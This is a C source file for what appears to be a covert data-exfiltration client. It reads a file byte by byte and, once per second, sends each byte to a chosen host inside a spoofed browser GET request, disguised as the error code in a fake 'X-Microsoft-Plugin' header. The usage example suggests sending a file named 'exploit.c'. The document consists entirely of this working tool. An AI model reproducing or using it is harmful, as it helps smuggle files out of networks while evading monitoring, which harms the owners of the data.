#include "client.h"

int main(int argc, char *argv[])
{
    int sockfd, numbytes, ch;
    char *requete = (char *)malloc(1024*sizeof(char));
    char target[20], uri[80], buf[MAXDATASIZE+1];
    struct hostent *he;
    struct sockaddr_in their_addr; 
    FILE *input;
    
    
    if (argc != 4) {
        fprintf(stderr,"Usage: %s Target Page File\n", argv[0]);
        fprintf(stderr,"Example: %s 195.25.63.78 /index.htm exploit.c\n", argv[0]);
        fprintf(stderr,"Page max size is 80 characters\n");
        fprintf(stderr,"File must contain ascii characters\n\n");
        exit(1);
    }
    
    strncpy(target, argv[1], 17);
    strncpy(uri, argv[2], 79);
    
    if ((he=gethostbyname(target)) == NULL) {  
     	herror("gethostbyname");
     	exit(1);
    }
    
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    	perror("socket");
    	exit(1);
    }
    their_addr.sin_family = AF_INET;      
    their_addr.sin_port = htons(PORT);    
    their_addr.sin_addr = *((struct in_addr *)he->h_addr);
    bzero(&(their_addr.sin_zero), 8);     
    
    if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1) { 
    	perror("connect");
    	exit(1);
    }
          
    if((input = fopen(argv[3], "rb")) == NULL) {
    	printf("I cannot open file %s for reading", argv[3]);
    	exit(1);
    }	
    
    else while((ch = fgetc(input)) != EOF) {
    
    	sleep(1);
      
    	requete = CreateQuery(uri, target, ch);
    	if (send(sockfd, requete, strlen(requete)+1, 0) == -1) {
    		  perror("send");
    		  break;
    		  }
    	  
   	printf("Sending Data: %c\n",ch);
   	
   	while ((numbytes = read(sockfd, buf, MAXDATASIZE)) != 0) {
   		buf[numbytes] = '\0';
	    	printf("Data successfully received.\n");
	    	break;
	    	}
    }
    fclose(input);
    free(requete);
    close(sockfd);
    return 0;
}


char *CreateQuery(char *page, char *host, int ch) {
	 char *header = (char *)malloc(1024*sizeof(char));
	 
    sprintf(header,
    "GET %s HTTP/1.1\r\n"
    "Host %s\r\n"
    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.6) Gecko/20040115\r\n"
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\r\n"
    "Accept-Language: fr,en;q=0.5\r\n"
	 "Accept-Encoding: gzip,deflate\r\n"
	 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
	 "Keep-Alive: 300\r\n"
	 "Connection: keep-alive\r\n"
    "X-Microsoft-Plugin: unexpected error %d\r\n"
    "\r\n",page,host,ch    
    );
    return (header);
}
